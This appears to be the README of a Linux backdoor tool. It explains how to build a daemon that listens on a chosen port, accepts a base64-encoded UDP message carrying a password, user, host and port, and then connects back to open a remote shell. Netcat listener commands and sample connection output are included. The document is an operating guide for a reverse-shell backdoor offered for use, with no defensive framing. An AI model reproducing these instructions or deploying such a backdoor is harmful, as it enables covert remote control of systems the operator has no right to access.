# Linux-BackDoor
This program provides an authenticated backdoor.

Operates under the x86/64 ArmV4l instruction set

To use, build and then execute.

The daemon will bind on the port that you set arbitrarily.

Listen to LPORT set arbitrarily with nc -nvlp.

Encode Protocol Message in Base64 using UDP Protocol and send it. If it binds correctly, a reply will 

be returned.


# How to Build
        make

# Protocol

        <DOOR>
                   <PASS>{Pass}</PASS>
                   <USER>{user}</USER>
                   <HOST>{lhost}</HOST>
                   <PORT>{lport}</PORT>
        </DOOR>

# Exece
        
    #  ps   
    
    PID TTY          TIME CMD
    176293 pts/2    00:00:00 door
    176310 pts/2    00:00:00 ps

#  Get Shell
    #nc -nvlp 4444                          
    
    listening on [any] 4444 ...
    connect to [127.0.0.1] from (UNKNOWN) [127.0.0.1] 47024